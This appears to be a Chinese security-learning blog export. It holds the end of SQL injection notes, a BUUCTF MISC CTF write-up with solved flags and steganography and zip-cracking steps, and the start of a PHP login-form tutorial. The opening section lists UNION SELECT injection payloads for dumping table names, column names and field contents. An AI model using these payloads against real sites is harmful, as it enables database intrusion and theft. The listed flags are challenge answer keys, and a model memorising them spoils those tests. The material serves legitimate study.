<p><strong>5.查表名</strong> </p>
<p>and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
<p><strong>6.查列名</strong> </p>
<p>and 1=2 union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 0,1</p>
<p><strong>7.查字段内容</strong> </p>
<p>and 1=2 union select 1,字段名,字段名 from 表名 limit 0,1</p>
<p><strong>注：</strong>函数<strong>GROUP_CONCAT</strong>将多行数据进行整合在一行输出</p>
</blockquote>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF MISC 一</title>
    <url>/2021/08/11/CTF-MISC-%E4%B8%80/</url>
    <content><![CDATA[<h1 id="BUUCTF-MISC-WP-一"><a href="#BUUCTF-MISC-WP-一" class="headerlink" title="BUUCTF MISC WP(一)"></a>BUUCTF MISC WP(一)</h1><p>做CTF MISC,我们要了解<a href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTF必备密码编码大全</a>。</p>
<p><a href="https://www.freebuf.com/sectool/282074.html">主要的CTF MISC工具下载</a>。</p>
<span id="more"></span>

<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="白捡-flag-flag-buu-ctf"><a href="#白捡-flag-flag-buu-ctf" class="headerlink" title="白捡 flag:flag{buu_ctf}"></a>白捡 flag:<code>flag&#123;buu_ctf&#125;</code></h2><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p><a href="https://tu.sioe.cn/gj/fenjie/">gif图片在线分解</a></p>
<p>flag:<code>flag&#123;he11ohongke&#125;</code></p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫描二维码显示secret is here，binwalk -e分解一下，有个压缩包，</p>
<p>注:<strong>binwalk下载</strong></p>
<p><a href="https://www.cnblogs.com/0yst3r-2046/p/12218770.html">binwalk在Windows10和kali_Linux下的安装及使用教程</a></p>
<p><a href="http://yll0024.xyz/images/pasted-77.png"><img src="http://yll0024.xyz/images/pasted-77.png" alt="玖涯博客"></a></p>
<p>根据提示，压缩包密码是四位数字，用Advanced Archive Password Recovery爆破就行了</p>
<p><a href="http://yll0024.xyz/images/pasted-78.png"><img src="http://yll0024.xyz/images/pasted-78.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;vjpw_wnoei&#125;</code></p>
<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>里面有个KEY.exe，直接运行不了，用winhex看一下</p>
<p><a href="http://yll0024.xyz/images/pasted-79.png"><img src="http://yll0024.xyz/images/pasted-79.png" alt="玖涯博客"></a></p>
<p>emmm，base64转图片（<a href="http://tool.chinaz.com/tools/imgtobase">在线base64转图片</a>）,把内容全复制进去，转出一张二维码，扫一下就有了(按照格式，最前面用flag包裹)。<br><code>flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>用Stegsolve分析一下File format就行了,注意去掉多余的空格</p>
<p><a href="http://yll0024.xyz/images/pasted-82.png"><img src="http://yll0024.xyz/images/pasted-82.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;stego_is_s0_bor1ing&#125;</code></p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>这个一开始方向做错了，我先用binwalk分解，分解出了一个zlib，后面尝试解压zlib失败，然后我用winhex看了一下，发现这是一张完整的图片，因为文件头是89 50 4E 47，文件尾是IEND，这是标准的png文件结构，然后尝试修改图片高度(一般png格式的图片可能考修改图片高度)</p>
<p><a href="http://yll0024.xyz/images/pasted-80.png"><img src="http://yll0024.xyz/images/pasted-80.png" alt="玖涯博客"></a></p>
<p>如图所示第二行六七个字节是文件高度，把第六个字节稍微改大点就行了，改的太大会看不到图片</p>
<p><a href="http://yll0024.xyz/images/pasted-81.png"><img src="http://yll0024.xyz/images/pasted-81.png" alt="玖涯博客"></a></p>
<p>得到flag:<code>flag&#123;He1l0_d4_ba1&#125;</code></p>
<h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>简单的爆破，4位数字，用Advanced Archive Password Recovery跑一下</p>
<p><a href="http://yll0024.xyz/images/pasted-83.png"><img src="http://yll0024.xyz/images/pasted-83.png" alt="玖涯博客"></a></p>
<p>然后base64解密一下就行了<a href="http://tool.chinaz.com/Tools/Base64.aspx">base64在线解密</a></p>
<p>flag:<code>flag&#123;70354300a5100ba78068805661b93a5c&#125;</code></p>
<h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>binwalk分离一下，没有其他文件，看一下属性-&gt;详细信息（exif）也没什么信息，继续用Stegsolve分析一下File format，在最后找到flag(去掉多余的空格)</p>
<p>flag:<code>flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</code></p>
<p><a href="http://yll0024.xyz/images/pasted-84.png"><img src="http://yll0024.xyz/images/pasted-84.png" alt="玖涯博客"></a></p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>最低有效位隐写，可用Stegsolve手动慢慢找，也可以用zsteg工具检测</p>
<p>kali安装zsteg：gem install zsteg</p>
<p>zsteg xxx.png/bmp直接把图片检测一下</p>
<p><a href="http://yll0024.xyz/images/pasted-85.png"><img src="http://yll0024.xyz/images/pasted-85.png" alt="玖涯博客"></a></p>
<p>zsteg显示分别在r,g,b第一位，顺序rgb，最低有效位隐藏有文件</p>
<p><a href="http://yll0024.xyz/images/pasted-86.png"><img src="http://yll0024.xyz/images/pasted-86.png" alt="玖涯博客"></a></p>
<p>因为zsteg的bit从1开始，Stegsolve的bit从0开始，所以在Stegsolve中选择Red,Green,Blue的第0位，顺序RGB，LSBfirst，preview一下果然有个png图片，save bin，保存为png格式，出现一张二维码，扫一下获得flag</p>
<p>flag:<code>flag&#123;1sb_i4_s0_Ea4y&#125;</code></p>
<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>flag在exif信息中，右键属性-&gt;详细信息</p>
<p><a href="http://yll0024.xyz/images/pasted-87.png"><img src="http://yll0024.xyz/images/pasted-87.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;870c5a72806115cb5439345d8b014396&#125;</code></p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>用wireshark打开慢慢找</p>
<p><a href="http://yll0024.xyz/images/pasted-88.png"><img src="http://yll0024.xyz/images/pasted-88.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</code></p>
<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>4位数字密码爆破，做过多次了</p>
<p>flag:<code>flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</code></p>
<h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>emmm….扫码就是flag</p>
<p>flag:<code>flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code></p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>题目标题就给出答案了….winhex打开</p>
<p><a href="http://yll0024.xyz/images/pasted-89.png"><img src="http://yll0024.xyz/images/pasted-89.png" alt="玖涯博客"></a></p>
<p>50 4B 03 04 zip文件头</p>
<p>14 00 解压文件所需 pkware 版本</p>
<p>00 00 全局方式位标记（是否有密码，00 00 无密码 09 00 有密码）</p>
<p>第六个字节改成00</p>
<p>flag:<code>flag&#123;Adm1N-B2G-kU-SZIP&#125;</code></p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>wireshark打开，发现一个POST包很可疑</p>
<p><a href="http://yll0024.xyz/images/pasted-91.png"><img src="http://yll0024.xyz/images/pasted-91.png" alt="玖涯博客"></a></p>
<p>右键追踪TCP流</p>
<p><a href="http://yll0024.xyz/images/pasted-92.png"><img src="http://yll0024.xyz/images/pasted-92.png" alt="玖涯博客"></a></p>
<p>这次POST请求没有上传任何文件，接着往下看，又发现一个TCP包，里面有POST请求</p>
<p><a href="http://yll0024.xyz/images/pasted-93.png"><img src="http://yll0024.xyz/images/pasted-93.png" alt="玖涯博客"></a></p>
<p>右键追踪TCP流</p>
<p><a href="http://yll0024.xyz/images/pasted-94.png"><img src="http://yll0024.xyz/images/pasted-94.png" alt="玖涯博客"></a></p>
<p>这次上传了一个JPG文件，在文件流最后发现flag</p>
<p>flag:<code>flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</code></p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>binwalk分解，四位数字密码爆破，老套路了。。。flag:<code>flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</code></p>
<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>binwalk没有分离出什么东西来，zsteg看一下就有flag了</p>
<p><a href="http://yll0024.xyz/images/pasted-90.png"><img src="http://yll0024.xyz/images/pasted-90.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;st3g0_saurus_wr3cks&#125;</code></p>
<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>远古时代的套路，binwalk分离文件，4位数字密码爆破。flag:<code>flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125;</code></p>
<h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>emm…做了这么多题了，首先试试binwalk，分离出一个压缩包，感觉又是4位数字密码爆破，爆了一下没爆出来。然后想到伪加密，修改zip加密标记，结果压缩包损坏，也不是伪加密。查看图片exif信息，发现压缩包密码</p>
<p><a href="http://yll0024.xyz/images/pasted-95.png"><img src="http://yll0024.xyz/images/pasted-95.png" alt="玖涯博客"></a></p>
<p>解压得到flag:<code>flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</code></p>
<h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>wireshark打开后全是TCP包，随便点一个，追踪tcp流，出现flag:<code>flag&#123;385b87afc8671dee07550290d16a8071&#125;</code></p>
<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>winhex打开，在最后发现一串可疑字符串（也可用strings monster.jpg看字符串）</p>
<p><a href="http://yll0024.xyz/images/pasted-96.png"><img src="http://yll0024.xyz/images/pasted-96.png" alt="玖涯博客"></a></p>
<p>二进制转字符串，就是flag</p>
<p><a href="http://yll0024.xyz/images/pasted-97.png"><img src="http://yll0024.xyz/images/pasted-97.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;koekj3s&#125;</code></p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>binwalk没分离出来,zsteg发现zip压缩包</p>
<p><a href="http://yll0024.xyz/images/pasted-98.png"><img src="http://yll0024.xyz/images/pasted-98.png" alt="玖涯博客"></a></p>
<p>根据信息，用StegSolve选择r,g,b的第0个bit，顺序rgb，LSBfirst，然后Save bin保存为zip，解压后发现一个没有后缀名的文件，用winhex看看文件头</p>
<p><a href="http://yll0024.xyz/images/pasted-99.png"><img src="http://yll0024.xyz/images/pasted-99.png" alt="玖涯博客"></a></p>
<p>文件头显示是linux可执行文件，拖入kali执行</p>
<p><a href="http://yll0024.xyz/images/pasted-100.png"><img src="http://yll0024.xyz/images/pasted-100.png" alt="玖涯博客"></a></p>
<p>flag:<code>flag&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</code></p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>得到图片和音频压缩包文件，图片下面的猜测为摩尔斯电码（错误），猜测为01二进制ASCII编码（错误），参看网上writeup了解为盲文。对照盲文对照表得：<code>kmdonowg</code>。猜测是压缩包的密码，解压得到音频，听着是摩尔斯电码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-.-.  -  ..-.  .--  .--.  .  ..  -----  ---..  --...  ...--  ..---  ..--..  ..---  ...--  -..  --..</span><br></pre></td></tr></table></figure>

<p>解密得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFWPEI08732?23DZ</span><br></pre></td></tr></table></figure>

<p>将CTF去掉改成flag提交：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wpei08732?23dz&#125;</span><br></pre></td></tr></table></figure>

<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>下载的图片使用hxd查看，搜索txt未果，搜索flag，成功找到。</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212407937-826374983.png" alt="image-20201113135149881"></p>
<p>括号中的进行base64解密得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h2><p>下载的压缩包需要解密，题目没有密码提示，猜测伪加密，放入hxd中拉到最后发现还有pk开头的，将pk开头的再横向偏移四个单位，将09 00改为00 00，解压成功。将得到的secret文件放入进制查看器hxd中查看，没有开头，尾部为AE 42 60 82，这是png文件的尾部格式。故将文件头改为89 50 4E 47，保存为png文件，得到一张图片（我失败了，图片打不开，参看别人的writeup），打开显示一串数字和字母结合的字符，猜测为ASCII编码，且为16进制，用<strong>captfencoder-1.3.0</strong>工具解密得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure>

<p>BJD改为flag即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure>

<p><strong>常见的文件头尾格式</strong>：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212440107-2049055665.png" alt="image-20201113141825962"></p>
<h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>图片放入hxd和stegsolve中都没有发现什么，参看别人的writeup说是图片的长宽不对等，利用hxd将图片的宽修改为与长相等并保存：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212439092-2053554416.png" alt="image-20201113143400741"></p>
<p>查看图片下方显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;PnG_He1ghT_1s_WR0ng&#125;</span><br></pre></td></tr></table></figure>

<p>将BJD改为flag提交。</p>
<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>根据题目提示：科学家用四位数字命名，即是此rar压缩包的加密方式，使用<strong>RARPasswordUnlocker</strong>暴力破解得到密码：<code>5463</code>。打开得到的txt文件，没见过此种编码方式：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212443246-1450103875.png" alt="image-20201119125844585"></p>
<p>参看别人的writeup，说是<code>brainfuck</code>代码，使用在线网站工具<strong>建立新的工程</strong>并将txt中的东西复制粘贴到代码区运行得到flag。此网站链接：<a href="http://bf.doleczek.pl/">http://bf.doleczek.pl/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h2><p>图片用hxd查看，直接搜索BJD没搜到，搜txt没搜到，stegsolve无果，参看别人题解在进制查看器（hxd、winhex都是）中搜索bjd即有flag。why/(ㄒoㄒ)/。也不知道自己第一次怎么搜的居然没搜到T^T。bjd改为flag提交。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;haokanma_xjj&#125;</span><br></pre></td></tr></table></figure>

<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>下载得到一个html文件夹，后门查杀和webshell是知识盲区。一个个找确实费时，参看网上的writeup得知有个专门扫描webshell、网站木马等的安全软件叫：<strong>D盾</strong>。下载D盾压缩包，打开<strong>D_Safe_Manage.exe</strong>，在查杀中将待查杀的文件拖入，如图：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212447450-1533339998.png" alt="image-20201114090443329"></p>
<p>打开对应文件，md5码只有pass处。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</span><br></pre></td></tr></table></figure>

<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>用进制查看器等打开都没啥信息，无头绪，宽带数据泄露，此前没碰到过，果断参看别人writeup得知：宽带数据也就是路由器信息数据需要用<strong>RouterPassView（路由器通行证视图）</strong>查看，去网上下载，打开查看，题目对flag没有任何提示，直接搜flag未果。之前有题的flag是管理员的登录密码，路由器信息数据中一般也会包含账号密码，搜密码，包上flag，错误，测试账号，正确。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;053700357621&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_45897326/article/details/103936479">https://blog.csdn.net/weixin_45897326/article/details/103936479</a></p>
<h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>用<strong>audacity</strong>打开，发现：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212456892-564557737.png" alt="image-20201116150005316"></p>
<p>将其放大（Ctrl+鼠标滚轮），发现其特征像摩尔斯电码，短杆敲为. 长杆敲为-。间隔地方用空格隔开，可得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</span><br></pre></td></tr></table></figure>

<p>用在线摩尔斯电码工具解得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5BC925649CB0188F52E617D70929191C</span><br></pre></td></tr></table></figure>

<p>包上flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5BC925649CB0188F52E617D70929191C&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong>：不知道为何用<strong>CaptfEncoder-win-x64-1.3.0.exe</strong>解得的摩尔斯电码结果有点出入，需要了解下原因，不止一次了（很有可能格式不对）。</p>
<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>题目说在线交流的数据包，追踪http协议的TCP流发现像是在传输什么，没有任何提示。</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212500195-122901242.png" alt="image-20201117154111788"></p>
<p>至此，无头绪了，参看他人writeup，说这块数据是base64加密的图片，拉到最下面撇去最后一行的那个0，确实是以=结尾，导出http对象，打开fenxi.php文件，整个文件内的内容就是base64加密后的图片，将此数据完善一下，开头加上：<code>data:image/png;base64,</code>编码内容紧跟其后，输入浏览器（学到了）：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212511593-884384661.png" alt="image-20201117154630905"></p>
<p>即可展示出图片：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212508710-508016229.png" alt="image-20201117154718954"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;209acebf6324a09671abc31c869de72c&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://blog.csdn.net/l11III1111/article/details/107804111">https://blog.csdn.net/l11III1111/article/details/107804111</a></p>
<h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环*"></a>九连环*</h2><p>图片用hxd查看，发现是个zip，里面带有一个加密压缩包和图片，用<strong>foremost</strong>分离：<code>foremost [文件名]</code>。得到一个加密压缩包，题目没有提示，猜测是伪加密，但是我破解不了。参看别人writeup得：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212514318-1349362796.png" alt="image-20201118155703851"></p>
<p>标记处原本为<code>01</code>，伪加密了，改成<code>00</code>。查看全局处最上面asd/PK处，没有进行伪加密，解压压缩包。</p>
<p><strong>注</strong>：不知为何我照着做一遍，内部的图片就是出不来，存在问题。</p>
<p>另外需要用到的工具：<strong>steghide</strong>，用于分析隐藏在图片中的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.cnblogs.com/yunqian2017/p/13298178.html">https://www.cnblogs.com/yunqian2017/p/13298178.html</a></p>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>下载得到的图片放入hxd中查看，开头是被篡改的文件。拉到尾部发现压缩包，并进行了伪加密，修改09为00，另存为zip压缩包，解压得到：<code>flag.vmdk</code>文件，这是虚拟机文件的格式，猜想这要是放到vmare虚拟机中有点不太可能，无解了。参看别人witeup：可用7z解压vmdk文件，在kali中进行解压，语句：<code>7z x flag.vmdk -o./</code>，得到了四个文件夹：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212519780-643061161.png" alt="image-20201119125413231"></p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212522466-977633396.png" alt="image-20201119125501501"></p>
<p>其中有一个key_part_one和key_part_two。打开key_part_one，得到的编码方式与<strong>神秘龙卷风</strong>中的编码方式很像，即<code>brainfuck</code>编码，放入brainfuck和ook编码的集合在线网站（<a href="https://www.splitbrain.org/services/ook%EF%BC%89%E4%B8%AD%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0%EF%BC%9A">https://www.splitbrain.org/services/ook）中解码得到：</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;N7F5_AD5</span><br></pre></td></tr></table></figure>

<p>在key_part_two文件夹中，有俩个文件夹，此文件夹<img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212525083-1818141137.png" alt="image-20201119130330723">明确说明了第二部分的flag在里面，打开，全是Ook。放入上述网站中解码得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_i5_funny!&#125;</span><br></pre></td></tr></table></figure>

<p>合并flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;N7F5_AD5_i5_funny!&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_45485719/article/details/107417878">https://blog.csdn.net/weixin_45485719/article/details/107417878</a></p>
<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>借鉴前面后门查杀的思路，将得到的压缩包解压到webshell后门文件夹，拖入到D盾中进行扫描：</p>
<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212528917-1290385871.png" alt="image-20201120101432083"></p>
<p>目标锁定上面三个文件，按顺序寻找，右键点击打开文件，发现上图打框的文件就有flag。搜索password不行，md5码写在pass，直接搜索pass即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>BUU MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB安全前后端基础</title>
    <url>/2021/08/11/WEB%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="后端基础PHP—表单验证"><a href="#后端基础PHP—表单验证" class="headerlink" title="后端基础PHP—表单验证"></a>后端基础PHP—表单验证</h2><h3 id="1-什么是表单"><a href="#1-什么是表单" class="headerlink" title="1.什么是表单"></a>1.什么是表单</h3><blockquote>
<p>表单在网页中主要<strong>负责数据采集</strong>功能。</p>
<p>一个表单有<strong>三个基本组成部分</strong>：</p>
<p><strong>表单标签</strong>：这里面包含了处理表单数据所用CGI程序的URL以及数据提交到服务器的方法。</p>
<p><strong>表单域</strong>：包含了文本框、密码框、隐藏域、多行文本框、复选框、单选框、下拉选择框和文件上传框等。</p>
<p><strong>表单按钮</strong>：包括提交按钮、复位按钮和一般按钮；用于将数据传送到服务器上的CGI脚本或者取消输入，还可以用表单按钮来控制其他定义了处理脚本的处理工作。</p>
<span id="more"></span>
</blockquote>
<p>使用场景：</p>
<p><strong>登录框 搜索框 留言框 上传框</strong>……（各种框）</p>
<table>
<thead>
<tr>
<th><img src="https://image.3001.net/images/20210623/1624438454_60d2f6b6405b378f2606d.png!small?1624438452911" alt="1624438454_60d2f6b6405b378f2606d.png!small?1624438452911"></th>
<th><img src="https://image.3001.net/images/20210623/1624438465_60d2f6c12dae5263df296.png!small?1624438463812" alt="1624438465_60d2f6c12dae5263df296.png!small?1624438463812"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="2-如何创建一个表单"><a href="#2-如何创建一个表单" class="headerlink" title="2.如何创建一个表单"></a>2.如何创建一个表单</h3><blockquote>
<p><strong>表单标签</strong>： <form action="URL" method="GET/POST"></form></p>
<p><strong>表单域</strong>：即表单组件，主要有 文本框、密码框、隐藏域、复选框、单选框、文件上传框 多行文本框(文本域) 下拉选择框 ……</p>
<p><strong>表单按钮</strong>： 提交按钮 复位按钮 一般按钮</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210623/1624441055_60d300dfa6f3e4754ea6a.png!small?1624441056111" alt="1624441055_60d300dfa6f3e4754ea6a.png!small?1624441056111"></p>
<h3 id="3-PHP和数据库交互"><a href="#3-PHP和数据库交互" class="headerlink" title="3.PHP和数据库交互"></a>3.PHP和数据库交互</h3><blockquote>
<p>PHP如何实现人机交互，用户如何才能把自己写的东西给PHP PHP如何接收？</p>
<p><strong>提交使用的就是表单</strong></p>
<p>接收分为<strong>三种</strong></p>
<p><strong>$_GET</strong> //接收GET传参</p>
<p><strong>$_POST</strong>//接收POST传参</p>
<p><strong>$_REQUEST</strong>//接收POST 和 GET传参</p>
<p>数组如何命名**$cars=array(“Volvo”,”BMW”,”Toyota”);**</p>
</blockquote>
<p><strong>表单实际上做到的是将数据提交到后端脚本，然后后端脚本接受后进行处理</strong>。</p>
<p>我们这里说的是<strong>PHP和mysql数据库</strong>交互：</p>
<blockquote>
<p>我们会用到一个PHP的扩展mysqli （不用担心，这是自带的插件，我们可以理解为是一套函数就行了） <strong>连接数据库</strong>:mysqli_connect(‘127.0.0.1’,’root’,’root’,’3_9’) (连接地址,连接账户,连接密码,连接数据库）</p>
<p><strong>执行数据库语句</strong>：mysqli_query($conn,$sql)  （数据库连接函数，执行的SQL语句）</p>
<p>通过数据库查询语句<strong>执行后得到的数据是一个对象</strong>，</p>
<p>我们需要<strong>将对象转化为数组</strong></p>
<p>从结果<strong>集取所有对象变为数组 mysqli_fetch_array($result)</strong> （执行数据库获得的结果集）</p>
<p><img src="https://image.3001.net/images/20210623/1624450284_60d324ec5bc6aa512727d.png!small?1624450283323" alt="1624450284_60d324ec5bc6aa512727d.png!small?1624450283323"></p>
<p>数据库基础结构：</p>
<p><strong>库 表 字段 数据</strong>=&gt; 库就是仓库 表就如同xls表，字段就是表头，数据就是内容</p>
</blockquote>
<h3 id="4-实战"><a href="#4-实战" class="headerlink" title="4.实战"></a>4.实战</h3><blockquote>
<p>描述：写一个登陆表单，并实现其注册 + 登录功能。</p>
<p>2、注册和登录功能都必须有</p>
<p>提示：     登录成功后需要给回显</p>
</blockquote>
<p>\1) 在Phpstudy的<strong>根目录</strong>(一般在Phpstudy的WWW目录)创建 <strong>login.php和register.php</strong></p>
<p><img src="https://image.3001.net/images/20210624/1624528657_60d4571133038ff0d55ac.png!small?1624528656766" alt="1624528657_60d4571133038ff0d55ac.png!small?1624528656766"></p>
<p>\2) <strong>创建自己的库，表，字段，数据</strong>。可以用<strong>MySQL-Front</strong></p>
<p><strong>3) 代码</strong></p>
<p><strong>login.php：</strong></p>
